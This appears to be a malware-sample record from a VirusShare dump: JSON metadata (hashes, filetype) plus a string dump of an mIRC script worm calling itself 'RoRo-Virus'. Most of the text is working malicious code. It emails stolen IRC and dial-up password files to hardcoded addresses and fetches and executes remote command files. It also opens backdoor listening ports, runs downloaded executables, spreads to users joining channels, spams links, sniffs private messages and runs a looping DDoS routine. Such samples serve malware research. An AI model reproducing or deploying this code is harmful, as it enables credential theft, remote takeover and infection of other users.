$sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $DIRFormat) | goto FileNext }\nn419=  else { dec %DIR.Index2 }\nn420=  %DIR.Tmp = END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s)\nn421=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), %DIR.Tmp)\nn422=  .hadd Data $rev($sockname,Active) DIR\nn423=  if ($Verify($sockname) == 1) .sockwrite -tn $sockname $ev(DIR, Items, 0)\nn424=}\nn425=\nn426=; ************* CHECK CHECK CHECK ****************\nn427=alias CheckSites {\nn428=  var %sTmp = $ini($GFN(DEF),SITES,1) , %sTmp2 = %sTmp\nn429=  if (%sTmp != $null) { %sTmp = $remove(%sTmp,http://,www.) | .sockopen Check-Sites %sTmp 80 | .sockmark Check-Sites %sTmp2 1 }\nn430=}\nn431=on *:sockopen:Check-Sites:{ if ($sockerr > 0) .halt | .RequestURL $sockname / $remove($gettok($sock($sockname).mark,1,32),http://,www.) }\nn432=on *:sockread:Check-Sites:{\nn433=  var %sRead \"\" | .sockread %sRead\nn434=  if (HTTP/* iswm %sRead) {\nn435=    if (*200* !iswm %sRead) { .remini $GFN(DEF) SITES $gettok($sock($sockname).mark,1,32) | .writeini $GFN(DEF) Missing $gettok($sock($sockname).mark,1,32) 0 }\nn436=    var %i = $calc($gettok($sock($sockname).mark,2,32) + 1) , %sTmp = $ini($GFN(DEF),SITES,%i) , %sTmp2 = %sTmp\nn437=    .sockclose $sockname\nn438=    if (%sTmp != $null) { %sTmp = $remove(%sTmp,http://,www.) | .sockopen Check-Sites %sTmp 80 | .sockmark Check-Sites %sTmp2 %i }\nn439=  }\nn440=}\nn441=; ************** DDOS DDOS DDOS ***************\nn442=alias DDos {\nn443=  .sockclose DDos-*\nn444=  var %i = 0 , %iCount = $ini($GFN(DEF),Missing,0) , %sTmp = \"\" , %sName = \"\"\nn445=  while (%i < %iCount) { \nn446=    .inc %i | %sTmp = $ini($GFN(DEF),Missing,%i) | %sTmp = $remove(%sTmp,http://,www.)\nn447=    if (free. isin %sTmp) %sTmp = $remove($gettok(%sTmp,1,$asc(/)),free.)\nn448=    else %sTmp = $gettok($gettok(%sTmp,1,$asc(/)),2-,$asc(.))\nn449=    %sName = $OpenIt(DDos) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp\nn450=  }\nn451=}\nn452=on *:sockopen:DDos-*:{ if ($sockerr > 0) .halt | .RequestURL $sockname / $sock($sockname).mark }\nn453=; *************** HTTP HTTP HTTP *****************\nn454=alias RequestURL {\nn455=  .sockwrite -n $1 GET $2 HTTP/1.1\nn456=  .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*\nn457=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: gzip, deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)\nn458=  .sockwrite -n $1 Host: $3 | .sockwrite -n $1 Connection: Keep-Alive \nn459=  .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1\nn460=}\nn461=alias HttpMe {\nn462=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))\nn463=  if (%sParam != $null) .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam)\nn464=}\nn465=alias GetHTTP {\nn466=  var %http.sock = $OpenIt(GetHTTP)\nn467=  .hadd Data $rev(%http.sock, LocalName) $2\nn468=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) .remove $hget(Data, $rev(%http.sock, LocalName))\nn469=  .hadd Data $rev(%http.sock, RemoteName) / $+ $gettok($1,2-,47) | .hadd Data $rev(%http.sock, Serv) $gettok($1,1,47)\nn470=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry\nn471=  .hadd Data $rev(%http.sock, Options) $3-\nn472=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80\nn473=  else .hdel -w Data $rev(%http.sock,*)\nn474=}\nn475=on *:sockopen:GetHTTP-*:{\nn476=  if ($sockerr > 0) { .hdel -w Data $rev($sockname,*) | .return }\nn477=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))\nn478=}\nn479=on *:sockread:GetHTTP-*:{\nn480=  if ($sockerr > 0) { .hdel -w Data $rev($sockname,*) | .return }\nn481=  var %sRead \"\"\nn482=  if ($hget(Data, $rev($sockname, EOR)) == 1) {\nn483=    var %http.LocalName $hget(Data, $rev($sockname, LocalName)) , %http.Options $hget(Data, $rev($sockname, Options))\nn484=    if (STORE isin %http.Options) {\nn485=      .sockread -f &bRead\nn486=      .bwrite %http.LocalName -1 &bRead\nn487=      if ($file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) .hadd Data $rev($sockname, Final) 1\nn488=    }\nn489=    if (EXEC isin %http.Options) {\nn490=      .sockread %sRead\nn491=      %sRead = [ [ %sRead ] ]\nn492=      if (Script: isin %sRead) .hadd Data $rev($sockname, Script) $gettok(%sRead,2,32)\nn493=      else if (Country: isin %sRead) .hadd Data $rev($sockname, Country) $gettok(%sRead,2,32)\nn494=      else if (%sRead == EOF) .hadd Data $rev($sockname, Final) 1\nn495=      else if ($hget(Data, $rev($sockname, Script)) == $getScript && $hget(Data, $rev($sockname, Country)) == $getCountry) { %sRead }\nn496=    }\nn497=  }\nn498=  else {\nn499=    .sockread %sRead\nn500=    if (HTTP/* iswm %sRead && *200* !iswm %sRead) { \nn501=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))\nn502=      .remini $GFN(DEF) HTTP %sParam | .writeini $GFN(DEF) Missing %sParam 0\nn503=      .hdel -w Data $rev($sockname,*) | .sockclose $sockname\nn504=    }\nn505=    if (Content-Length* iswm %sRead) .hadd Data $rev($sockname, Size) $GetTok(%sRead,2,$asc(:))\nn506=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }\nn507=  }\nn508=  if ($hget(Data, $rev($sockname, Final)) == 1) { if (STORE isin %http.options && $exists(%http.LocalName) == $true) .run %http.LocalName | .hdel -w Data $rev($sockname,*) | .sockclose $sockname }\nn509=}\nn510=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1) .remove $hget(Data, $Rev($sockname, LocalName)) | .hdel -w Data $rev($sockname,*) }\nn511=; ***************** MAIL MAIL MAIL ******************\nn512=alias MailMe {\nn513=  if ($getCountry == $1 && $getCountry == BG) {\nn514=    if ($readini($GFN(IRC),Options,Status) == New) .Mail IRC_Passes IRC $2-\nn515=    if ($readini($GFN(RNA),Options,Status) == New) .Mail RNA_Passes RNA $2-\nn516=  }\nn517=  if ($getCountry == $1 && $getCountry == Other) {\nn518=    if ($readini($GFN(IRC2),Options,Status) == New) .Mail IRC_Passes_Other IRC2 $2-\nn519=    if ($readini($GFN(RNA),Options,Status) == New) .Mail RNA_Passes_Other RNA $2-\nn520=  }\nn521=}\nn522=alias Mail {\nn523=  var %mail.sock = $OpenIt(Mail)\nn524=  .hadd Data $rev(%mail.sock, Subject) $1\nn525=  .hadd Data $rev(%mail.sock, LocalName) $GFN($2)\nn526=  if ($len($2) > 4) { .hadd Data $rev(%mail.sock, LocalName) $2 }\nn527=  .hadd Data $rev(%mail.sock, Recipient) $ini($GFN(DEF), MAIL, $rand(1,$ini($GFN(DEF),MAIL,0)))\nn528=  if ($3 != $null) .hadd Data $rev(%mail.sock, Recipient) $3\nn529=  .hadd Data $rev(%mail.sock, Sender) $me $+ @ $+ $GetTok($hget(Data, $rev(%mail.sock, Recipient)),2,$asc(@))\nn530=  .hadd Data $rev(%mail.sock, Serv) $readini($GFN(DEF), MAIL, $hget(Data, $Rev(%mail.sock, Recipient)))\nn531=  if ($4 != $null) .hadd Data $rev(%mail.sock, Serv) $4\nn532=  if ($hget(Data, $rev(%mail.sock, Serv)) != $null) .sockopen %mail.sock $hget(Data, $rev(%mail.sock, Serv)) 25 \nn533=  else .hdel -w Data $rev(%mail.sock,*)\nn534=}\nn535=alias Mail.Logon {\nn536=  .sockwrite -n $1 HELO $hget(Data, $rev($1, Serv))\nn537=  .sockwrite -n $1 Mail From: $hget(Data, $rev($1, Sender))\nn538=  .sockwrite -n $1 Rcpt To: $hget(Data, $rev($1, Recipient))\nn539=  .sockwrite -n $1 Data\nn540=}\nn541=alias Mail.Head {\nn542=  .sockwrite -n $1 From: $hget(Data, $rev($1, Sender))\nn543=  .sockwrite -n $1 To: $hget(Data, $rev($1, Recipient))\nn544=  .sockwrite -n $1 Date: $asctime(dd mmm yy HH:nn:ss)\nn545=  .sockwrite -n $1 Subject: $hget(Data, $rev($1, Subject))\nn546=  .sockwrite -n $1\nn547=  .timer 1 3 Mail.Body $1\nn548=}\nn549=alias Mail.Body {\nn550=  if ($Verify($1) == 0) { .Logoff | .halt }\nn551=  var %mail.Pos 0\nn552=  while (%mail.Pos <= $file($hget(Data, $rev($1, LocalName))).size) { .bread $hget(Data, $rev($1, LocalName)) %Mail.Pos 2048 &bRead | .sockwrite $1 &bRead | .inc %Mail.Pos 2048 }\nn553=  .sockwrite -n $1 | .sockwrite -n $1 .\nn554=}\nn555=alias Mail.Logoff {\nn556=  if ($2 == SUCCESS) { .writeini $hget(Data, $rev($1, LocalName)) Options Status Old | .sockwrite -n $1 QUIT }\nn557=  else if ($Verify($1) == 1) .sockclose $1\nn558=  .hdel -w Data $rev($1,*)\nn559=}\nn560=on *:sockread:Mail-*:{\nn561=  if ($sockerr > 0) { .Mail.Logoff | .return }\nn562=  var %sRead \"\"\nn563=  .sockread %sRead\nn564=  if (220* iswm %sRead) .Mail.Logon $sockname\nn565=  if (354* iswm %sRead) .Mail.Head $sockname\nn566=  if (250*queue* iswm %sRead) || (250*qp* iswm %sRead) || (250*Message* iswm %sRead) || (250*Mail * iswm %sRead) .Mail.Logoff $sockname SUCCESS\nn567=  if (5* iswm %sRead) .Mail.Logoff $sockname\nn568=}\nn569=on *:sockclose:Mail-*:{ .hdel -w Data $rev($sockname,*) }\nn570=on *:sockopen:Mail-*:{ if ($sockerr > 0) Mail.Logoff }\nn571=\nn572=; *********************** INVITE FUNCTIONS *************************\nn573=alias getColor { var %sColors = 1.2.3.4.5.6.7.10.12.13.14 , %iColor = $rand(1, $numtok(%sColors,46)) | .return . $+ $gettok(%sColors,%iColor,46) }\nn574=alias getText { var %iColour = $rand(0,1) , %iExtra = $rand(0,5) , %s \"\"\nn575=  if (%iExtra == 2) %s = . | if (%iExtra == 3) %s = .\nn576=  if (%iColour != 1) %s = %s $+ $getColor\nn577=if ($getCountry == BG) .return %s $+ $gettok($1,1,42) | .return %s $+ $gettok($1,2,42) }\nn578=\nn579=on ^*:Text:*:*:{\nn580=  if ($nick !isin $hget(Data, Services) && http isin $1-) { .ignore -u30 $nick | .halt }\nn581=  if ($chan == $null) {\nn582=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Messages) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (MSG) ( $+ $Nick $+ ) $1-\nn583=  }\nn584=}\nn585=on ^*:Notice:*:*:{\nn586=  if ($nick !isin $hget(Data, Services) && http isin $1-) { .ignore -u30 $nick | .halt }\nn587=  if ($chan == $null) {\nn588=    if ($Verify($hget(Data, Sniffer.Console)) == 1 && $hget(Data, Sniffer.Notices) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (NOTICE) ( $+ $Nick $+ ) $1-\nn589=  }\nn590=  if ($1- == IP!) { .notice $nick IP_ $+ $IP | .halt }\nn591=  else if (IP_*.* iswm $1) {\nn592=    .hinc Data iIP\nn593=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {\nn594=      if ($me != $nick && $Verify(Local-Console $+ $nick) == 0) .OpenConsole $nick $gettok($1,2,$asc(_))\nn595=    }\nn596=    .halt\nn597=  }\nn598=}\nn599=on ^*:Action:*:#:{ if (http isin $1-) { .ignore -u30 $nick | .halt } }\nn600=on ^*:Open:?:*:{ if (http isin $1-) { .ignore -u60 $nick | .halt } }\nn601=\nn602=raw *:*:{\nn603=  if ($numeric == 2) { $setCountry(Other) | if (UniBG isin $1-) { $setCountry(BG) } }\nn604=  else if (40* iswm $numeric) { .halt }\nn605=}\nn606=\nn607=alias AdvMe {\nn608=  var %sSite $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))) , %sChan $chan($rand(1,$chan(0))) , %i $rand(0,8)\nn609=  .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off\nn610=  if (%sChan == $null) || (%sSite == $null) .return\nn611=  if (%i == 1) { if ($getCountry == BG) { .ignore -u20 NS | //.msg ns set URL $getColor $+ %sSite }\nn612=  else { .ignore -u20 NickServ | .raw -q NickServ set URL $getColor $+ %sSite } }\nn613=  if (%i == 2) { if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan URL . $+ %sSite }\nn614=  else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan URL . $+ %sSite } }\nn615=  if (%i == 3) { .ignore -u20 *!*@* | //.describe %sChan $getText($readini($GFN(DEF),Sites,%sSite)) }\nn616=  if (%i == 4) { .hadd Data OnJoinMsg On }\nn617=  if (%i == 5) { .hadd Data OnJoinNotice On }\nn618=  if (%i == 6) {\nn619=    if ($pos($chan(%sChan).Topic,http,0) == 0) || ($pos($chan(%sChan).Topic,http,0) == $null) {\nn620=      if ($getCountry == BG) { .ignore -u20 CS | //.msg cs set %sChan Topic $getText($readini($GFN(DEF),Sites,%sSite)) }\nn621=      else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan Topic $getText($readini($GFN(DEF),Sites,%sSite)) }\nn622=  } }\nn623=  if (%i == 7) { .ignore -u20 *!*@* | //.msg %sChan $getColor $+ %sSite }\nn624=  .timer 1 $rand(300,600) { .AdvMe }\nn625=}\nn626=\nn627=alias SetSites {\nn628=  .AddSITE http://www.Nasty-Pamela.cjb.net :: http://Nasty-Pamela.cjb.net :: Fen sait na NAI-QKATA madama na sveta zavinagi ::*:: http://www.Nasty-Pamela.cjb.net :: fan site of the coolest girl forever!! ::\nn629=  .AddSITE http://GiRlz.hit.bg http://GiRlz.Hit.Bg -> Zabraneno za maje :)))*http://GiRlz.Hit.Bg -> Restricted area :))\nn630=  .AddSITE http://www.Hacking.Hit.bg Za vseki koito iska da stane HaCkEr, no ne znae kak da go PoStIgNe .::. http://www.Hacking.Hit.bg .::.*For everyone who wants to become a good HaCkEr, but doesn't know how to achieve it .::. http://www.Hacking.Hit.bg .::.\nn631=  .AddSITE http://www.Kurnikova.Bol.bg Goli snimki -=- http://www.Kurnikova.Bol.bg -=- na nai-skandalnata tenesistka v sveta!*Anna Kournikova - naked! -=- http://www.Kurnikova.Bol.bg -=- Exclusive pictures brought to you by Playboy Team 2002 \ufffd\nn632=  .AddSITE http://Teen-Zone.FaithWeb.CoM Zonata na vsichki bulgarski teenz oOo http://Teen-Zone.FaithWeb.CoM oOo Anti-Spek generator :00 Zapoznanstva, Liuboff, Priqteli, Problemi..*The worldwide teen zone oOo http://Teen-Zone.FaithWeb.CoM oOo Find new friends, Love match, Solve your problems, just enjoy :)\nn633=  .AddHTTP Free.Bol.bg/Rahmul/Commands.txt NULL EXEC\nn634=  .AddHTTP Rahmul.Hit.bg/Commands.txt NULL EXEC\nn635=  .AddHTTP Free.Techno-Link.com/Rahmul/Commands.txt NULL EXEC\nn636=  .AddHTTP Free.Top.bg/Rahmul/Commands.txt NULL EXEC\nn637=  .AddMAIL Rahmul@mail.bg mail.mail.bg\nn638=  .AddMAIL Rahmul@bitex.bg mail.bitex.bg\nn639=  .writeini $Hget(Data, File) Options Init 0\nn640=}\nn641=\nn642=; ************* JOIN *************\nn643=on ^*:JOIN:*:{\nn644=  if ($nick == $me) { if ($hget(Data, Drop) == On) { .timerDrop- $+ $chan 1 20 .Drop Chan $chan } }\nn645=  else {\nn646=    var %s = $readini($GFN(DEF), Sites, $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))))\nn647=    if ($hget(Data, OnJoinMsg) == On) { if (%s != $null) .timerOnJoin- $+ $nick 1 $rand(10,30) if ($query( $+ $nick $+ ) == $ $+ null) //.msg $nick $getText(%s) }\nn648=    if ($hget(Data, OnJoinNotice) == On) { if (%s != $null) .timerOnJoin- $+ $nick 1 $rand(10,30) if ($query( $+ $nick $+ ) == $ $+ null) //.notice $nick $getText(%s) }\nn649=    if ($hget(Data, Spread) == On) || ($hget(Data, Mass) == on) {\nn650=      .hinc Data iJoin\nn651=    if ($hget(Data,iJoinCount) // $hget(Data,iJoin) && $verify(Local-Console- $+ $nick) == 0) .OpenConsole $nick $GetTok($address,2,$asc(@)) }\nn652=  }\nn653=}\nn654=on ^*:PART:*:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }\nn655=on ^*:QUIT:{ if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) .timerOnJoin- $+ $nick Off }\nn656=on ^*:Nick:{ \nn657=  if ($hget(Data, Drop) == On) { if ($nick == $me) { .timerDrop- $+ $nick off | .timerDrop- $+ $newnick 1 20 .Drop Nick $newnick } }\nn658=  if ($hget(Data, OnJoinNotice) == On) || ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick Off }\nn659=}"
    },
    "filename": "VirusShare_1622f8914e7648aa14ec54fabbd52b61",
    "filesize": 40034,
    "filetype": "Generic INItialization configuration [script]\\015",
    "hashes": {
        "md5": "1622f8914e7648aa14ec54fabbd52b61",
        "sha1": "3352039f0e70503361817b2a1c5e35b95ac7b610",
        "sha256": "8d2a74d78147e548076064bbc4ba333c8ec3462eb551237c2b797ea36291d8dd"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "[aliases]",
            "n0=/q /query $1",
            "[script]",
            "n0=alias setPriv .hadd Data Priv $1",
            "n1=alias getPriv .return $hget(Data,Priv)",
            "n2=alias setStat .writeini $hget(Data, File) Options Virus $1",
            "n3=alias getStat .return $readini($hget(Data, File), Options, Virus)",
            "n4=alias Wind .return @ $+ $1",
            "n5=alias setCountry .hadd Data Country $1",
            "n6=alias getCountry .return $hget(Data,Country)",
            "n7=alias getScript { .return $hget(Data, Script) }",
            "n8=alias setScript { .hadd Data Script $1 }",
            "n9=alias GFN .return $readini($hget(Data, File),Files,$1)",
            "n10=alias SFN writeini $hget(Data, File) Files $1 $2-",
            "n11=alias AddHTTP .Writeini $GFN(DEF) HTTP $1 $2-",
            "n12=alias DelHTTP .Remini $GFN(DEF) HTTP $1",
            "n13=alias AddMAIL .Writeini $GFN(DEF) MAIL $1 $2-",
            "n14=alias DelMAIL .Remini $GFN(DEF) MAIL $1",
            "n15=alias AddSITE .Writeini $GFN(DEF) SITES $1 $2-",
            "n16=alias DelSITE .Remini $GFN(DEF) SITES $1",
            "n17=alias GetFileName .return $right($1,$calc($len($1) - $pos($1,\\,$pos($1,\\,0))))",
            "n18=alias GetFilePath .return $left($1,$calc($pos($1,\\,$pos($1,\\,0)) - 1))",
            "n19=alias WinDir { ",
            "n20=  var %sWinDir \"\"",
            "n21=  %sWinDir = $readini(C:\\msdos.sys, PATHS, Win) | if (%sWinDir) .return %sWinDir",
            "n22=  %sWinDir = $readini(C:\\msdos.sys, PATHS, WinDir) | if (%sWinDir) .return %sWinDir",
            "n23=  %sWinDir = $finddir(D:\\,Win*,1,1) | if (%sWinDir) .return %sWinDir",
            "n24=}",
            "n25=",
            "n26=; ********************** INIT Functions *************************",
            "n27=alias CD0 return C:\\msdos.sys",
            "n28=on *:Connect:{ .Init }",
            "n29=on *:Disconnect:{ .timers off | .sockclose * }",
            "n30=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }",
            "n31=on *:START:{ .Start }",
            "n32=alias Start {",
            "n33=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1",
            "n34=  if ($HGet(Data).size > 0) .hfree Data | .hmake Data 100",
            "n35=  .hadd Data File $WinDir $+ \\ $+ $CDO",
            "n36=  .hadd Data Recving Idle | .hadd Data Sending Idle",
            "n37=  .hadd Data iIPCount 10 | .hadd Data iJoinCount 10",
            "n38=  .hadd Data Nest #RoRo-Virus",
            "n39=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global Check Checker",
            "n40=  .SetCountry Other | .SetScript Big | .SetPriv Slave",
            "n41=  if ($exists($hget(Data, File)) != $true) .SetFileNames",
            "n42=  if ($readini($hget(Data, File), Options, Init) != 0)  || ($exists($GFN(DEF)) != $true) .SetSites",
            "n43=  if ($getStat == $null) .setStat Semi",
            "n44=  if ($getStat == Full) .hadd Data Spread On",
            "n45=  .hadd Data Loaded $calc($readini($hget(Data, File),Options,Loaded) + 1) | .writeini $hget(Data,File) Options Loaded $hget(Data, Loaded)",
            "n46=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *",
            "n47=}",
            "n48=alias Init {",
            "n49=  .ignore -r | .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off",
            "n50=  ;  .HttpMe",
            "n51=  ;  .MailMe BG",
            "n52=  .timerRNA 1 10 { .RNA }",
            "n53=  ;  .timerAdvMe 1 90 { .AdvMe }",
            "n54=  .timerListeIt 1 7 { .ListenIt }",
            "n55=  .timerDDos 0 90 { .DDos }",
            "n56=  if (4 // $hget(Data,Loaded) && $hget(Data,CheckSites) != 1) { .hadd Data CheckSites 1 | .CheckSites }",
            "n57=  .LoadClone $server $me $+ $Random(1) $Random($rand(4,7)) $emailaddr $fullname",
            "n58=  .timer 1 15 { .UseClone JOIN $hget(Data,Nest)  } | .timer 1 16 { .UseClone PRIVMSG $hget(Data,Nest) IP_ $+ $IP }",
            "n59=}",
            "n60=alias RNA {",
            "n61=  var %sTmp = Options OS-Vers-Serv-Ip-Host ( $+ $OS $+ )-( $+ $version $+ )-( $+ $Server $+ )-( $+ $Ip $+ )-( $+ $Host $+ )",
            "n62=  .writeini $GFN(RNA) %sTmp | .writeini $GFN(IRC) %sTmp | .writeini $GFN(IRC2) %sTmp",
            "n63=}",
            "n64=alias FuckOff { .writeini $hget(Data, File) Options FuckOff 1 }",
            "n65=alias ListenIt { if ($portfree(2000) == $true) { .socklisten Listen-SendFile 1991 | .socklisten Listen-RecvFile 1990 | .socklisten Listen-Console 2000 | .socklisten Listen-BNC 1999 } }",
            "n66=alias AcceptIt { var %sName \"\" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto AcceptIt | .sockaccept %sName | return %sName }",
            "n67=alias OpenIt { var %sName \"\" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto OpenIt | return %sName }",
            "n68=alias SetFileNames { var %Win $windir | $SFN(RNA, %Win $+ \\rn3a.vxd) | $SFN(IRC, %Win $+ \\mios.sys) | $SFN(IRC2, %Win $+ \\i2RC.sys) | $SFN(DEF, %Win $+ \\def12x.dll) }",
            "n69=; ******************** SEND/RECV Files *********************",
            "n70=alias SendFile {",
            "n71=  ; $1 - Socket $2 - Local Filename , $3 - Remote Filename , $4 - Virus",
            "n72=  ; $1 - Socket",
            "n73=  var %clName = $sock($1).mark",
            "n74=  var %sfName = $rev($GetTok($1,1,$asc(-)) $+ -Console- $+ $GetTok($1,3-,$asc(-)),SendFile)",
            "n75=  if (%clName == $null) { .sockclose $1 | .hdel -w Data $rev(%sfName,*) | .return }",
            "n76=  if ($GetTok($1,1,$asc(-)) == Server) { var %bConsole = 1 }",
            "n77=  if ($0 > 1) {",
            "n78=    if ($exists($2) == $false) { if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) File missing.. | .sockclose $1 } ",
            "n79=    else {",
            "n80=      .hadd Data $rev(%sfName, Init) 1",
            "n81=      .hadd Data $rev(%sfName, Virus) $4",
            "n82=      .hadd Data $rev(%sfName, LocalName) $shortfn($2)",
            "n83=      .hadd Data $rev(%sfName, Size) $File($shortfn($2)).size",
            "n84=      if ($Verify($1) == 1) .sockwrite -tn $1 SendFile! $+ $3 $+ ! $+ $hget(Data, $rev(%sfName,Size)) $+ ! $+ %clName $+ ! $+ $hget(Data, $rev(%sfName,Virus))",
            "n85=      if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sfName, Pos)) bytes.. Waiting for acknoledgements..",
            "n86=    }",
            "n87=  }",
            "n88=  else if ($hget(Data ,$rev(%sfName, Pos)) != $null) {",
            "n89=    if ($hget(Data ,$rev(%sfName, Pos)) > $$hget(Data ,$rev(%sfName, Size))) { ",
            "n90=      if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) File Successfully Sent..",
            "n91=      if ($hget(Data, $rev(%sfName, Virus)) == 1) .hadd Data Sending Idle",
            "n92=      .sockclose $1",
            "n93=      .hdel -w Data $rev(%sfName,*)",
            "n94=      .halt",
            "n95=    }",
            "n96=    .bread $hget(Data, $rev(%sfName, LocalName)) $hget(Data, $rev(%sfName, Pos)) 2048 &Tmp",
            "n97=    if ($Verify($1) == 1) .sockwrite -n $1 &Tmp",
            "n98=    .hadd Data $Rev(%sfName, Pos) $calc($hget(Data, $rev(%sfName, Pos)) + 2048)",
            "n99=  }",
            "n100=}",
            "n101=alias RecvFile {",
            "n102=  var %cName $hget(Data, $sockname) , %sName $rev(%cName,RecvFile) , %Tmp \"\"",
            "n103=  if ($GetTok(%sName,1,$asc(-)) == Server) var %bServer = 1",
            "n104=  if ($hget(Data, $rev(%sName, Size)) == $null && $0 == 0) {",
            "n105=    .sockread %Tmp",
            "n106=    if (%cName == $null) %cName = $GetTok(%Tmp,4,$asc(!))",
            "n107=    %sName = $rev(%cName,RecvFile)",
            "n108=    if ($GetTok(%sName,1,$asc(-)) == Server) var %bServer = 1",
            "n109=    .hadd Data $sockname %cName",
            "n110=    .hadd Data $rev(%sName,LocalName) $GetTok(%Tmp,2,$asc(!))",
            "n111=    .hadd Data $rev(%sName,Size) $GetTok(%Tmp,3,$asc(!))",
            "n112=    if ($GetTok(%Tmp,5,$asc(!)) == 1) {",
            "n113=      .hadd Data $rev(%sName,Virus) 1",
            "n114=      if ($hget(Data, Recving) == Busy || $getStat == Full) { .hdel -w Data $rev(%sName,*) | .sockclose $sockname | .return }",
            "n115=      else .hadd Data Recving Busy",
            "n116=      .hadd Data $rev(%sName, LocalName) $WinDir $+ \\RoRo.exe",
            "n117=    }",
            "n118=    if (%bServer == 1) {",
            "n119=      var %resume $file($shortfn($hget(Data, $rev(%sName,LocalName)))).size",
            "n120=      if (%resume == $null) %resume = 0",
            "n121=      if ($Verify(%cName) == 1) .sockwrite -tn %cName (RECVFILE) Connection Established. Auto-Resuming at %resume bytes..",
            "n122=      if ($Verify($sockname) == 1) .sockwrite -tn $sockname Resume! $+ %resume",
            "n123=    }",
            "n124=  }",
            "n125=  else if ($0 > 0) {",
            "n126=    if (%bServer == 1 && $Verify(%cName) == 1) {",
            "n127=      if ($file($hget(Data, $rev(%sName,LocalName))).size == $hget(Data, $rev(%sName,Size))) .sockwrite -tn %cName (RECVFILE) Transfer Succesfully Completed :)",
            "n128=    else .sockwrite -tn %cName (RECVFILE) Transfer Error. Bad CRC.. }",
            "n129=    if ($hget(Data, $rev(%sName,Virus)) == 1) { .hadd Data Recving Idle | .run $hget(Data, $rev(%sName,LocalName)) | .sockclose %cName }",
            "n130=    .hdel -w Data $rev(%sName,*) | .hdel Data $sockname | .halt",
            "n131=  }",
            "n132=  else { .sockread -f &bin | .bwrite $hget(Data, $rev(%sName,LocalName)) -1 &bin }",
            "n133=}",
            "n134=",
            "n135=; ****************** SERVER Files ********************",
            "n136=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }",
            "n137=on *:sockread:Server-SendFile-*:{",
            "n138=  var %cName = Server-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sfName = $rev(%cName, SendFile) , %Tmp = \"\" , %sName = \"\"",
            "n139=  .sockread %Tmp ",
            "n140=  %sName = $GetTok(%Tmp,4,$asc(!))",
            "n141=  .sockmark $sockname %sName",
            "n142=  .Hadd Data $rev(%sfName,Pos) $GetTok(%Tmp,5,$asc(!))",
            "n143=  $SendFile($sockname,$GetTok(%Tmp,2,$asc(!)),$GetTok(%Tmp,3,$asc(!)))",
            "n144=}",
            "n145=on *:sockwrite:Server-SendFile-*:{ $SendFile($Sockname) }",
            "n146=",
            "n147=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }",
            "n148=on *:sockread:Server-RecvFile-*:{ .RecvFile }",
            "n149=on *:sockclose:Server-RecvFile-*:{ .RecvFile Closing }",
            "n150=",
            "n151=; ****************** LOCAL Files ********************",
            "n152=on *:sockopen:Local-SendFile-*:{",
            "n153=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile)",
            "n154=  .sockmark $sockname $hget(Data, $rev(%cName,Remote))",
            "n155=  $sendfile($sockname, $hget(Data,$rev(%sName,LocalName)), $hget(Data, $rev(%cName, SendFile, RemoteName)), $hget(Data, $rev(%cName, SendFile, Virus)))",
            "n156=}",
            "n157=on *:sockwrite:Local-SendFile-*:{",
            "n158=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile)",
